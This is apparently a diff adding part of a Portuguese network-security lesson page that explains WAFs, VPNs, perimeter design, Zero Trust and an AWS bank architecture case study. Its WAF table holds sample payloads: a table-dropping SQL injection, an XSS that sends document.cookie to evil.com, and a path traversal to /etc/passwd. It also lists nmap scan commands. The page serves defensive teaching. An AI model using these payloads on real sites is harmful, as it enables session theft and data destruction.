+      <h2 class="section-title">8. WAF (Web Application Firewall) — O Inspetor Especializado</h2>
+      <p>
+        Um firewall de camada de rede tradicional olha apenas cabeçalhos IP e portas. Se a porta 443 (HTTPS) está aberta, ele deixa o pacote passar. No entanto, o invasor não tenta quebrar a porta 443 — ele tenta enviar comandos maliciosos embutidos nas requisições HTTP normais.
+      </p>
+      <p>
+        O <strong>WAF</strong> atua na <strong>Camada 7 (Aplicação)</strong>. Ele analisa o payload, os parâmetros de query, headers HTTP, cookies e o corpo de requisições JSON/XML/multipart.
+      </p>
+
+      <div class="table-container">
+        <table class="study-table">
+          <thead>
+            <tr>
+              <th>Vetor de Ataque (OWASP)</th>
+              <th>O Que o Invasor Tenta Inserir</th>
+              <th>Como o WAF Neutraliza</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>SQL Injection (SQLi)</strong></td>
+              <td>Comandos SQL maliciosos em campos de busca (ex: <code>' OR 1=1; DROP TABLE usuarios;--</code>).</td>
+              <td>Identifica operadores de banco de dados e sintaxes suspeitas nas entradas antes de chegar ao backend.</td>
+            </tr>
+            <tr>
+              <td><strong>Cross-Site Scripting (XSS)</strong></td>
+              <td>Scripts JavaScript embutidos em comentários ou inputs (ex: <code>&lt;script&gt;fetch('//evil.com/?c='+document.cookie)&lt;/script&gt;</code>).</td>
+              <td>Bloqueia tags HTML maliciosas, vetores de codificação e eventos perigosos (<code>onerror=</code>, <code>onload=</code>).</td>
+            </tr>
+            <tr>
+              <td><strong>Path Traversal / LFI</strong></td>
+              <td>Tentativa de escapar da raiz web para ler arquivos do sistema operacional (ex: <code>../../../../etc/passwd</code>).</td>
+              <td>Descarta requisições que contenham sequências de escape de diretório ou acessos a arquivos protegidos.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- SECTION 9 -->
+    <section id="sec-9">
+      <h2 class="section-title">9. VPN (Virtual Private Network) — O Acesso Remoto Seguro</h2>
+      <p>
+        Quando funcionários ou administradores precisam trabalhar fora do escritório corporativo, não podemos simplesmente expor portas de gerenciamento (SSH, RDP, painéis internos) na internet pública.
+      </p>
+      <p>
+        A <strong>VPN</strong> cria um <em>túnel lógico criptografado</em> entre o dispositivo do usuário remoto e a borda da rede interna. O túnel garante integridade e sigilo: ninguém no Wi-Fi público da cafeteria ou no provedor consegue bisbilhotar o tráfego.
+      </p>
+
+      <div class="callout callout-warn">
+        <div class="callout-header">⚠️ A Analogia: "O caseiro entra pela portaria, não pula o muro"</div>
+        <p>
+          O caseiro de confiança da mansão chega pelo portão de acesso com a credencial legítima. Ele não pula a cerca nos fundos. No entanto, o fato de ele entrar com a credencial de caseiro não autoriza que ele abra a gaveta de joias da suíte principal. <strong>O túnel VPN protege o trânsito da informação, mas não substitui autenticação forte (MFA), autorização estrita e auditoria detalhada.</strong>
+        </p>
+      </div>
+
+      <div class="card-grid">
+        <div class="sub-card">
+          <h4>1. Autenticar Forte</h4>
+          <p>Validar credencial do operador combinando senha corporativa, certificado de máquina e token de múltiplos fatores (MFA).</p>
+        </div>
+        <div class="sub-card">
+          <h4>2. Estabelecer Túnel</h4>
+          <p>Criptografar o tráfego de ponta a ponta utilizando protocolos robustos (IPsec, WireGuard ou OpenVPN).</p>
+        </div>
+        <div class="sub-card">
+          <h4>3. Conceder Somente o Necessário</h4>
+          <p>O cliente VPN recebe rota e firewall restrito apenas aos servidores pertinentes à sua função funcional.</p>
+        </div>
+        <div class="sub-card">
+          <h4>4. Registrar Telemetria</h4>
+          <p>Logar início de sessão, IP público de origem, volume transmitido e duração da conexão para auditoria do SOC.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 10 -->
+    <section id="sec-10">
+      <h2 class="section-title">10. A Evolução do Conceito: A Dissolução da Borda Rígida</h2>
+      <p>
+        Nos anos 1990 e 2000, o modelo clássico de segurança era comumente comparado a uma <strong>noz ou castelo medieval rígido</strong>: uma casca exterior de pedra duríssima (firewall perimetral) e um miolo extremamente macio e ingênuo no interior (confiança irrestrita para quem estivesse fisicamente conectado aos cabos de rede azul da empresa).
+      </p>
+      <p>
+        Esse modelo desmoronou no mundo contemporâneo. Hoje as aplicações rodam em nuvens públicas multifacetadas (AWS, Azure, GCP), os colaboradores atuam de casa em modelo home office, sistemas integram-se por APIs públicas com terceiros e dispositivos móveis transitam constantemente entre redes.
+      </p>
+      
+      <div class="callout callout-info">
+        <div class="callout-header">🛡️ O Novo Paradigma Perimetral</div>
+        <p>
+          O muro físico foi substituído por <strong>fronteiras lógicas e dinâmicas</strong>. O perímetro não desapareceu — ele se multiplicou e aproximou-se dos dados e das identidades. Como defendem os arquitetos modernos: <em>"O muro protege e continua fundamental. Porém, ele nunca mais poderá ser a única razão para você confiar em quem está do lado de dentro."</em>
+        </p>
+      </div>
+    </section>
+
+    <!-- SECTION 11 -->
+    <section id="sec-11">
+      <h2 class="section-title">11. A Tríade da Defesa: Perímetro + Zero Trust + Defesa em Profundidade</h2>
+      <p>
+        Como esses três conceitos centrais do nosso curso conversam entre si na prática? Retomando o que aprendemos na Aula 1, eles não competem: eles operam em perfeita sintonia harmônica.
+      </p>
+
+      <div class="table-container">
+        <table class="study-table">
+          <thead>
+            <tr>
+              <th>Doutrina Defensiva</th>
+              <th>Premissa Central de Segurança</th>
+              <th>Papel na Proteção da Mansão</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Perímetro de Segurança</strong></td>
+              <td>Primeira linha de contenção. Reduz a superfície exterior, canaliza e filtra fluxos massivos de entrada.</td>
+              <td>A cerca eletrificada externa, o fosso d'água, as guaritas e as cancelas de checagem inicial.</td>
+            </tr>
+            <tr>
+              <td><strong>Zero Trust (Confiança Zero)</strong></td>
+              <td><em>"Nunca confie, sempre verifique."</em> Assume que o adversário já pode ter ultrapassado a muralha.</td>
+              <td>Toda porta interna exige leitura biométrica e crachá; ninguém anda desacompanhado só porque passou da guarita.</td>
+            </tr>
+            <tr>
+              <td><strong>Defesa em Profundidade</strong></td>
+              <td>Múltiplas camadas independentes de controles: se uma barreira falhar, a próxima mitiga o desastre.</td>
+              <td>Portão externo &rarr; grades da recepção &rarr; cão de guarda no jardim &rarr; porta de aço do cofre com segredo duplo.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- SECTION 12 -->
+    <section id="sec-12">
+      <h2 class="section-title">12. Estudo de Caso — Arquitetura de Perímetro do "Banco Seguro" na AWS</h2>
+      <p>
+        Para compreender a aplicação concreta em engenharia de sistemas, analisemos o <strong>Banco Seguro</strong>: uma fintech brasileira em franca expansão com mais de 500.000 correntistas ativos. Sua solução compreende aplicativo mobile (Android/iOS), Internet Banking web, integrações de APIs bancárias parceiras e conexão regulatória ao Sistema de Pagamentos Instantâneos (SPI/PIX do Banco Central).
+      </p>
+      <p>
+        Toda a infraestrutura do Banco Seguro está hospedada na Amazon Web Services (AWS). O princípio norteador da equipe de arquitetura é claro: <strong>"O próprio desenho topológico da rede já é a primeira e mais decisiva política de segurança."</strong>
+      </p>
+
+      <div class="arch-diagram" aria-label="Diagrama da Arquitetura do Banco Seguro">
+INTERNET PÚBLICA (Usuários Mobile, Navegadores Web, Atacantes em Varredura)
+        │
+        ▼ [Tráfego HTTPS Criptografado :443]
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 1. AWS WAF (Filtro L7 OWASP: anti-SQLi, anti-XSS, rate limiting de IPs)     │
+└─────────────────────────────────────┬───────────────────────────────────────┘
+                                      │ (Requisições Válidas e Limpas)
+                                      ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 2. Sub-rede Pública (DMZ da Nuvem / VPC)                                    │
+│    • Application Load Balancer (ALB)                                        │
+│    • Terminação TLS / Inspeção de Certificados                              │
+│    • Security Group: Permite entrada :443 de ANYWHERE (0.0.0.0/0)           │
+└─────────────────────────────────────┬───────────────────────────────────────┘
+                                      │ (Encaminhamento interno HTTP/gRPC)
+                                      ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 3. Sub-rede Privada de Aplicações (Backends Microservices)                  │
+│    • Containers ECS / Clusters EKS isolados da internet direta             │
+│    • NÃO possuem IPs públicos (sem rota direta com Gateway de Internet)     │
+│    • Security Group: Aceita conexões EXCLUSIVAMENTE originadas do ALB       │
+└─────────────────────────────────────┬───────────────────────────────────────┘
+                                      │ (Consultas SQL autenticadas :5432)
+                                      ▼
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 4. Sub-rede Isolada de Dados (Core Bancário - PostgreSQL / Ledger PIX)       │
+│    • Bancos de Dados Relacionais em Multi-AZ                                │
+│    • Sem acesso a nenhuma saída ou entrada da Internet                      │
+│    • Security Group: Permite entrada :5432 APENAS da Sub-rede de Aplicações │
+└─────────────────────────────────────────────────────────────────────────────┘
+      </div>
+
+      <p>
+        Observe o isolamento sistemático: mesmo que um invasor na internet descubra uma vulnerabilidade de dia zero no PostgreSQL, ele é fisicamente incapaz de disparar pacotes diretamente contra o IP do banco de dados, pois o core reside em uma <strong>sub-rede totalmente isolada sem rota externa</strong>. O único caminho de contato é convencer a aplicação na camada intermediária a fazer uma consulta maliciosa — e essa aplicação está protegida pelo WAF e pelas validações de código.
+      </p>
+    </section>
+
+    <!-- SECTION 13 & 14 (Tabs: Professor & Aluno) -->
+    <section id="sec-13">
+      <h2 class="section-title">13 & 14. Práticas Guiadas — Construção e Análise em Sala</h2>
+      
+      <div class="tab-nav" role="tablist">
+        <button class="tab-btn active" onclick="switchTab(event, 'tab-prof')" role="tab">👨‍🏫 Seção 13: Trilha do Professor</button>
+        <button class="tab-btn" onclick="switchTab(event, 'tab-aluno')" role="tab">💻 Seção 14: Trilha do Aluno (Mãos à Obra)</button>
+      </div>
+
+      <!-- Trilha do Professor -->
+      <div id="tab-prof" class="tab-pane active" role="tabpanel">
+        <div class="panel">
+          <h3 style="margin-top:0;">Roteiro de Construção Visual na Lousa</h3>
+          <p>
+           Vamos construir progressivamente as camadas de segurança do Banco Seguro:
+          </p>
+          <ol>
+            <li><strong>Traçar a Fronteira:</strong> Desenhe o retângulo delimitando a VPC (Virtual Private Cloud) e marque a linha de fronteira com a internet externa.</li>
+            <li><strong>Posicionar o Posto de Controle:</strong> Insira o WAF e o Load Balancer na borda pública da DMZ.</li>
+            <li><strong>Encapsular a Regra de Negócio:</strong> Desenhe o módulo de aplicações na sub-rede privada sem endereçamento IP público.</li>
+            <li><strong>Blindar o Cofre Central:</strong> Isole a base de dados na camada mais profunda, com regras estritas de firewall local (Security Groups).</li>
+            <li><strong>Instalar a Torre de Observação:</strong> Conecte agentes de IDS/IPS e sensores de espelhamento de fluxo (VPC Traffic Mirroring) reportando ao SIEM.</li>
+          </ol>
+
+          <div class="callout callout-think">
+            <div class="callout-header">❓ Questões de Discussão em Grupo</div>
+            <ul>
+              <li>Se o container da aplicação for invadido por injeção de dependência comprometida, ele consegue varrer outras máquinas da rede corporativa?</li>
+              <li>Onde exatamente você posicionaria as sondas do IDS/IPS: antes do WAF ou entre o Load Balancer e a aplicação interna?</li>
+              <li>Podemos considerar o Application Load Balancer (ALB) da sub-rede pública como a nossa moderna DMZ? Por quê?</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Trilha do Aluno -->
+      <div id="tab-aluno" class="tab-pane" role="tabpanel">
+        <div class="panel">
+          <h3 style="margin-top:0;">Exercício Prático de Mapeamento do Próprio Cenário</h3>
+          <p>
+            Cada aluno ou dupla deve selecionar o cenário do seu projeto prático semestral (e-commerce, hospital, portal governamental, SaaS) e transpor o modelo conceitual preenchendo a matriz de fronteiras:
+          </p>
+
+          <div class="table-container">
+            <table class="study-table">
+              <thead>
+                <tr>
+                  <th>Componente Perimetral</th>
+                  <th>Missão Primária</th>
+                  <th>No Banco Seguro (AWS)</th>
+                  <th>Como Será no Seu Cenário?</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><strong>Firewall / WAF</strong></td>
+                  <td>Filtrar HTTP/S e tráfego L3/L4 indesejado.</td>
+                  <td>AWS WAF + Security Groups de entrada.</td>
+                  <td><em>Ex: Cloudflare WAF + iptables no host Linux.</em></td>
+                </tr>
+                <tr>
+                  <td><strong>Segmentação</strong></td>
+                  <td>Separar apresentação, lógica e armazenamento.</td>
+                  <td>Sub-redes VPC públicas, privadas e de DB.</td>
+                  <td><em>Ex: Redes Docker internas isoladas ou VLANs.</em></td>
+                </tr>
+                <tr>
+                  <td><strong>Detecção (IDS/IPS)</strong></td>
+                  <td>Sinalizar comportamentos furtivos e anomalias.</td>
+                  <td>Amazon GuardDuty + VPC Flow Logs.</td>
+                  <td><em>Ex: Snort ou Suricata monitorando interface eth0.</em></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="callout callout-warn">
+            <div class="callout-header">🔍 Pergunta Investigativa</div>
+            <p>
+              Execute uma auto-auditoria mental sobre a sua aplicação de trabalho: <strong>"O que está exposto diretamente à internet que poderia muito bem estar confinado dentro de uma sub-rede interna ou atrás de um túnel seguro?"</strong>
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 15 -->
+    <section id="sec-15">
+      <h2 class="section-title">15. Ferramentas Leves — O Arsenal do Defensor</h2>
+      <p>
+        Para compreender a perspectiva do atacante que sonda nossas muralhas, o engenheiro de defesa utiliza as mesmíssimas ferramentas de auditoria e reconhecimento.
+      </p>
+
+      <h3 class="section-subtitle">A. Reconhecimento Perimetral com nmap</h3>
+      <p>
+        O <strong>nmap (Network Mapper)</strong> é o instrumento padrão da indústria para auditar portas e descobrir quais serviços estão visíveis a partir de um determinado ponto de rede:
+      </p>
+
+      <div class="code-block">
+<span class="comment"># 1. Identificar versões reais de serviços nas portas abertas mais comuns:</span>
+<span class="cmd">nmap</span> <span class="flag">-sV</span> <span class="muted">alvo-autorizado.local</span>
+
+<span class="comment"># 2. Varrer minuciosamente o espaço completo de portas TCP (todas as 65.535 portas):</span>
+<span class="cmd">nmap</span> <span class="flag">-p-</span> <span class="muted">alvo-autorizado.local</span>
+
+<span class="comment"># 3. Tentar inferir o sistema operacional por meio de fingerprinting TCP/IP:</span>
+<span class="cmd">nmap</span> <span class="flag">-O</span> <span class="muted">alvo-autorizado.local</span>
+
+<span class="comment"># 4. Inspeção rápida de scripts NSE para checagem básica de vulnerabilidades:</span>
+<span class="cmd">nmap</span> <span class="flag">-sV --script=vuln</span> <span class="muted">alvo-autorizado.local</span>
+      </div>
+
+      <div class="callout callout-alert">
+        <div class="callout-header">⚖️ A Regra de Ouro da Ética Hacker</div>
+        <p>
+          <strong>Curiosidade técnica rigorosa deve andar sempre de mãos dadas com a autorização expressa.</strong> Jamais execute varreduras contra servidores, faculdades ou empresas sem consentimento formal prévio por escrito. Utilize ambientes controlados, máquinas virtuais locais (VirtualBox, Docker) ou plataformas de laboratório autorizadas.
+        </p>
+      </div>
+
+      <h3 class="section-subtitle">B. Análise de Fluxo com Wireshark & Laboratórios Práticos</h3>
+      <ul>
+        <li><strong>Wireshark:</strong> Retomando nosso aprendizado da Aula 1, use o Wireshark para capturar o exato momento em que pacotes SYN chegam à interface e compare o comportamento de portas abertas (retorno <em>SYN-ACK</em>) contra portas filtradas por firewall (ausência de resposta ou pacote <em>ICMP Destination Unreachable</em>).</li>
+        <li><strong>TryHackMe & Hack The Box:</strong> Recomendamos a conclusão das salas gratuitas <em>"Intro to Network Security"</em>, <em>"Firewalls & IDS"</em> e <em>"Network Segmentation Basics"</em>.</li>
+      </ul>
+    </section>
+
+    <!-- SECTION 16 -->
+    <section id="sec-16">
+      <h2 class="section-title">16. Os Perigos de um Perímetro Mal Projetado</h2>
+      <p>
+        A história recente da segurança cibernética está repleta de tragédias que ilustram com precisão as consequências de ignorar os fundamentos de arquitetura:
+      </p>
+
+      <div class="card-grid">
+        <div class="sub-card" style="border-top: 3px solid #ef4444;">
+          <h4>🚨 Exposição Excessiva</h4>
+          <p>
+            Portas administrativas desnecessárias (como SSH na 22 ou RDP na 3389) abertas diretamente para o mundo inteiro sem restrição de IP ou VPN prévia.
+          </p>
+        </div>
+        <div class="sub-card" style="border-top: 3px solid #ef4444;">
+          <h4>⚡ Falta de Segmentação</h4>
+          <p>
+            Uma rede plana interna permite que o comprometimento de uma simples impressora ou termostato IoT sirva de trampolim para alcançar controladores de domínio corporativos.
+          </p>
+        </div>
+        <div class="sub-card" style="border-top: 3px solid #ef4444;">
+          <h4>🎭 Confiança Cega na Borda</h4>
+          <p>
+            Supor que qualquer requisição que venha de um IP interno é benigna e confiável por definição.
+          </p>
+        </div>
+        <div class="sub-card" style="border-top: 3px solid #ef4444;">
+          <h4>🥚 Perímetro Único Casca de Ovo</h4>
+          <p>
+            Toda a proteção da companhia concentrada em uma única caixa de firewall. Se essa caixa falhar ou for bypassada, nenhum outro controle existe no interior.
+          </p>
+        </div>
+      </div>
+
+      <!-- Reference Incident: PIX 2025 -->
+      <div class="callout callout-alert">
+        <div class="callout-header">💥 Incidente de Referência: O Ataque ao PIX via Fornecedor Terceirizado</div>
+        <p>
+          No caso emblemático de ataque a infraestruturas de pagamento integrado, a instituição bancária possuía firewalls perimetrais caríssimos e WAFs de última geração na sua borda principal. No entanto, uma empresa terceirizada de manutenção possuía uma chave de acesso direto com privilégios irrestritos para manutenção remota.
+        </p>
+        <p style="margin-top:0.5rem;">
+          Os invasores comprometeram primeiramente a máquina do fornecedor (o elo mais fraco da cadeia de suprimentos) e entraram pela porta aberta da frente com a chave legítima em mãos. <strong>O muro externo era de granito maciço, mas o portão dos fundos estava escancarado sem inspeção interna.</strong> Quem tem a chave do seu portão?
+        </p>
+      </div>
+    </section>
+
+    <!-- SECTION 17 -->
+    <section id="sec-17">
+      <h2 class="section-title">17. Fechamento da Aula & Micro-tarefa de Aprendizagem</h2>
+      
+      <div class="callout callout-think">
+        <div class="callout-header">🎯 Pergunta-Guia para Fixação Intelectual</div>
+        <p style="font-size: 1.05rem; font-weight:600;">
+          "Defender rigorosamente o perímetro é suficiente para garantir a segurança dos nossos sistemas? Por que sim e por que não?"
+        </p>
+      </div>
+
+      <p>
+        <strong>Resposta doutrinária esperada para um cientista da computação:</strong><br>
+        <strong>Não, categoricamente não.</strong> O perímetro de rede é essencial como <em>filtro de primeira linha</em> para conter varreduras automatizadas, ataques de força bruta indiscriminados e diminuir o ruído exterior. Todavia, a segurança contemporânea exige a fusão de <strong>Zero Trust</strong> (verificação ininterrupta de identidade e integridade de cada requisição interna) com <strong>Defesa em Profundidade</strong> (múltiplas camadas de proteção com controles no endpoint, no código, no banco e na criptografia dos dados em repouso).
+      </p>
+
+      <h3 class="section-subtitle">Micro-tarefa Individual (Checklist Interativo)</h3>
+      <p>Marque os itens ao concluir o rascunho de documentação do seu próprio cenário:</p>
+
+      <ul class="checklist">
+        <li class="checklist-item">
+          <input type="checkbox" id="chk1" onchange="updateProgress()">
+          <label for="chk1"><strong>Controle de Perímetro 1 (Borda Web):</strong> Defini qual WAF ou proxy reverso filtrará as requisições HTTP e portas externas expostas no meu projeto.</label>
+        </li>
+        <li class="checklist-item">
+          <input type="checkbox" id="chk2" onchange="updateProgress()">
+          <label for="chk2"><strong>Controle de Perímetro 2 (Segmentação):</strong> Separei claramente a camada onde rodam as aplicações da sub-rede onde residem os bancos de dados confidenciais.</label>
+        </li>
+        <li class="checklist-item">
+          <input type="checkbox" id="chk3" onchange="updateProgress()">
+          <label for="chk3"><strong>Controle de Perímetro 3 (Acesso de Administração):</strong> Bloqueei o acesso direto a portas administrativas (SSH/banco) pela internet, canalizando-as por VPN ou Bastion Host autenticado.</label>
+        </li>
+        <li class="checklist-item">
+          <input type="checkbox" id="chk4" onchange="updateProgress()">
+          <label for="chk4"><strong>Identificação de 1 Limitação Real:</strong> Documentei textualmente o que aconteceria se um usuário legítimo tivesse suas credenciais vazadas ou sua máquina sequestrada.</label>
+        </li>
+      </ul>
+      <div id="checklist-feedback" class="muted" style="font-size:0.85rem; font-weight:600;">Progresso da Micro-tarefa: 0 de 4 concluídos</div>
+    </section>
+
+    <!-- SECTION 18 -->
+    <section id="sec-18">
+      <h2 class="section-title">18. Como a Mentalidade Blue e o Perímetro Alimentam seu Portfólio</h2>
+      <p>
+        Toda essa bagagem técnica não existe no vácuo acadêmico. Ela alimenta diretamente os dois grandes artefatos profissionais que compõem o portfólio prático da nossa disciplina:
+      </p>
+
+      <div class="card-grid">
+        <div class="sub-card">
+          <h4>📑 Artefato 07: Plano DevSecOps</h4>
+          <p>
+            <strong>Operações Seguras, Rede e Hardening.</strong> A arquitetura de perímetro concebida hoje define os fluxos exatos de comunicação que serão implementados via código de infraestrutura (Terraform / Docker Compose), os scripts de hardening que fecharão portas desnecessárias e os alarmes de monitoramento no pipeline contínuo.
+          </p>
+        </div>
+        <div class="sub-card">
+          <h4>🚨 Artefato 08: Plano de Resposta a Incidentes</h4>
+          <p>
+            <strong>Detecção Precoce e Contenção Imediata.</strong> Seus controles perimetrais são os primeiros sensores a disparar sinais vitais de comprometimento. Além disso, no momento em que um incidente é confirmado, o perímetro é a primeira ferramenta empregada para isolar a máquina comprometida do restante da organização antes que o dano se alastre.
+          </p>
+        </div>
+      </div>
+
+      <div class="callout callout-info" style="text-align: center; margin-top:2rem;">
+        <p style="font-size: 1.1rem; font-weight: 700; color: #1e3a8a;">
+          "Vamos terminar o projeto aqui: desenhe com clareza, justifique com embasamento técnico e registre cada decisão de fronteira. A integridade da mansão depende da firmeza das suas muralhas!"
+        </p>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer style="margin-top: 5rem; padding-top: 2rem; border-top: 1px solid var(--border); text-align: center;" class="muted">
+      <p style="font-size: 0.9rem;">
+        Bacharelado em Ciência da Computação — Instituto Federal Catarinense (IFC Videira)<br>
+        Disciplina de <strong>Segurança em Sistemas</strong> • Material Didático Desenvolvido para Estudo Autônomo e de Sala de Aula.
+      </p>
+      <p style="font-size: 0.8rem;">
+        Construído sob premissas de Acessibilidade WCAG AA, Engenharia de Defesa Cibernética e Didática Ativa.
+      </p>
+    </footer>
+
+  </main>
+
+  <!-- Interactive Client-side Script -->
+  <script>
+    // Tab switcher for pedagogical tracks
+    function switchTab(evt, tabId) {
+      const tabs = document.querySelectorAll('.tab-btn');
+      const panes = document.querySelectorAll('.tab-pane');
+      
+      tabs.forEach(btn => btn.classList.remove('active'));
+      panes.forEach(pane => pane.classList.remove('active'));
+      
+      evt.currentTarget.classList.add('active');
+      const targetPane = document.getElementById(tabId);
+      if (targetPane) {
+        targetPane.classList.add('active');
+      }
+    }
+
+    // Scroll reading progress indicator
+    window.addEventListener('scroll', () => {
+      const totalHeight = document.documentElement.scrollHeight - window.innerHeight;
+      const progress = totalHeight > 0 ? (window.scrollY / totalHeight) * 100 : 0;
+      const bar = document.getElementById('progress-bar');
+      if (bar) {
+        bar.style.width = Math.min(progress, 100) + '%';
+      }
+    });
+
+    // Micro-task checklist progress tracker
+    function updateProgress() {
+      const checkboxes = document.querySelectorAll('.checklist input[type="checkbox"]');
+      let checkedCount = 0;
+      checkboxes.forEach(cb => {
+        if (cb.checked) checkedCount++;
+      });
+
+      const feedback = document.getElementById('checklist-feedback');
+      if (feedback) {
+        feedback.textContent = `Progresso da Micro-tarefa: ${checkedCount} de ${checkboxes.length} concluídos`;
+        if (checkedCount === checkboxes.length) {
+          feedback.textContent = `🎉 Excelente! Todos os 4 critérios de perímetro foram contemplados no seu plano de estudo!`;
+          feedback.style.color = '#16a34a';
+        } else {
+          feedback.style.color = '';
+        }
+      }
+    }
+  </script>
+<script>
+/* Skip artifact shell — fixed helpers served beside every artifact. */
+(function () {
+  "use strict";
+
+  var fmt = {
+    num: function (v, opts) { return new Intl.NumberFormat("pt-BR", opts || {}).format(v); },
+    brl: function (v) { return new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL" }).format(v); },
+    pct: function (v) { return new Intl.NumberFormat("pt-BR", { style: "percent", maximumFractionDigits: 1 }).format(v); }
+  };
+
+  // axisFmt keeps axis tick labels short (compact notation) so long values
+  // (e.g. full BRL amounts) never clip against the plot edge.
+  function axisFmt(v) {
+    return fmt.num(v, { notation: "compact", maximumFractionDigits: 1 });
+  }
+
+  // format accepts a function OR one of the fmt names ("num" | "brl" | "pct").
+  function coerceFormat(spec) {
+    if (typeof spec === "function") return spec;
+    if (typeof spec === "string" && fmt[spec]) return fmt[spec];
+    return function (v) { return fmt.num(v); };
+  }
+
+  function accent() {
+    return getComputedStyle(document.documentElement).getPropertyValue("--accent").trim() || "#2563eb";
+  }
+  function mutedColor() {
+    return getComputedStyle(document.documentElement).getPropertyValue("--text-muted").trim() || "#5b6472";
+  }
+  function svgEl(tag, attrs) {
+    var el = document.createElementNS("http://www.w3.org/2000/svg", tag);
+    for (var k in attrs) el.setAttribute(k, attrs[k]);
+    return el;
+  }
+  function frame(el, w, h) {
+    var svg = svgEl("svg", { viewBox: "0 0 " + w + " " + h, role: "img" });
+    el.innerHTML = "";
+    el.appendChild(svg);
+    return svg;
+  }
+
+  // maxOf guards the axis scale: empty values would give -Infinity (truthy,
+  // so "|| 1" can't catch it) and a non-positive max would flip the chart.
+  function maxOf(values) {
+    var m = values.length ? Math.max.apply(null, values) : 0;
+    return m > 0 ? m : 1;
+  }
+
+  // bar(el, {labels:[], values:[], color?, format?}) — vertical bar chart.
+  function bar(el, cfg) {
+    var W = 640, H = 280, padL = 46, padB = 30, padT = 12;
+    var svg = frame(el, W, H);
+    var max = maxOf(cfg.values);
+    var n = cfg.values.length;
+    var plotW = W - padL - 12, plotH = H - padT - padB;
+    var step = plotW / n, bw = Math.min(step * 0.62, 64);
+    var color = cfg.color || accent();
+    var f = coerceFormat(cfg.format);
+    for (var g = 0; g <= 4; g++) {
+      var gy = padT + plotH - (plotH * g) / 4;
+      svg.appendChild(svgEl("line", { x1: padL, y1: gy, x2: W - 12, y2: gy, stroke: "currentColor", "stroke-opacity": 0.08 }));
+      var lbl = svgEl("text", { x: padL - 8, y: gy + 4, "text-anchor": "end", "font-size": 10, fill: mutedColor() });
+      lbl.textContent = axisFmt((max * g) / 4);
+      svg.appendChild(lbl);
+    }
+    cfg.values.forEach(function (v, i) {
+      var bh = Math.max(0, (v / max) * plotH);
+      var x = padL + i * step + (step - bw) / 2;
+      var y = padT + plotH - bh;
+      var r = svgEl("rect", { x: x, y: y, width: bw, height: bh, rx: 4, fill: color });
+      var t = svgEl("title", {});
+      t.textContent = cfg.labels[i] + ": " + f(v);
+      r.appendChild(t);
+      svg.appendChild(r);
+      var tx = svgEl("text", { x: x + bw / 2, y: H - 10, "text-anchor": "middle", "font-size": 11, fill: mutedColor() });
+      tx.textContent = cfg.labels[i];
+      svg.appendChild(tx);
+    });
+  }
+
+  // line(el, {labels:[], values:[], color?, format?}) — single-series line.
+  function line(el, cfg) {
+    var W = 640, H = 280, padL = 46, padB = 30, padT = 12;
+    var svg = frame(el, W, H);
+    var max = maxOf(cfg.values);
+    var n = cfg.values.length;
+    var plotW = W - padL - 16, plotH = H - padT - padB;
+    var color = cfg.color || accent();
+    var f = coerceFormat(cfg.format);
+    for (var g = 0; g <= 4; g++) {
+      var gy = padT + plotH - (plotH * g) / 4;
+      svg.appendChild(svgEl("line", { x1: padL, y1: gy, x2: W - 16, y2: gy, stroke: "currentColor", "stroke-opacity": 0.08 }));
+      var lbl = svgEl("text", { x: padL - 8, y: gy + 4, "text-anchor": "end", "font-size": 10, fill: mutedColor() });
+      lbl.textContent = axisFmt((max * g) / 4);
+      svg.appendChild(lbl);
+    }
+    var pts = cfg.values.map(function (v, i) {
+      var x = padL + (n === 1 ? plotW / 2 : (plotW * i) / (n - 1));
+      var y = padT + plotH - (v / max) * plotH;
+      return [x, y];
+    });
+    var d = pts.map(function (p, i) { return (i ? "L" : "M") + p[0].toFixed(1) + " " + p[1].toFixed(1); }).join(" ");
+    svg.appendChild(svgEl("path", { d: d, fill: "none", stroke: color, "stroke-width": 2, "stroke-linejoin": "round" }));
+    pts.forEach(function (p, i) {
+      var c = svgEl("circle", { cx: p[0], cy: p[1], r: 3.5, fill: color });
+      var t = svgEl("title", {});
+      t.textContent = cfg.labels[i] + ": " + f(cfg.values[i]);
+      c.appendChild(t);
+      svg.appendChild(c);
+      var tx = svgEl("text", { x: p[0], y: H - 10, "text-anchor": "middle", "font-size": 11, fill: mutedColor() });
+      tx.textContent = cfg.labels[i];
+      svg.appendChild(tx);
+    });
+  }
+
+  // donut(el, {labels:[], values:[], colors?}) — donut with center total.
+  function donut(el, cfg) {
+    var W = 320, H = 280, cx = W / 2, cy = H / 2, R = 92, r = 58;
+    var svg = frame(el, W, H);
+    var total = cfg.values.reduce(function (a, b) { return a + b; }, 0) || 1;
+    var palette = cfg.colors || [accent(), "#1baf7a", "#eda100", "#e34948", "#4a3aa7", "#e87ba4"];
+    var a0 = -Math.PI / 2;
+    cfg.values.forEach(function (v, i) {
+      var a1 = a0 + (v / total) * Math.PI * 2;
+      var large = a1 - a0 > Math.PI ? 1 : 0;
+      var p = ["M", cx + R * Math.cos(a0), cy + R * Math.sin(a0),
+        "A", R, R, 0, large, 1, cx + R * Math.cos(a1), cy + R * Math.sin(a1),
+        "L", cx + r * Math.cos(a1), cy + r * Math.sin(a1),
+        "A", r, r, 0, large, 0, cx + r * Math.cos(a0), cy + r * Math.sin(a0), "Z"].join(" ");
+      var path = svgEl("path", { d: p, fill: palette[i % palette.length] });
+      var t = svgEl("title", {});
+      t.textContent = cfg.labels[i] + ": " + fmt.num(v) + " (" + fmt.pct(v / total) + ")";
+      path.appendChild(t);
+      svg.appendChild(path);
+      a0 = a1;
+    });
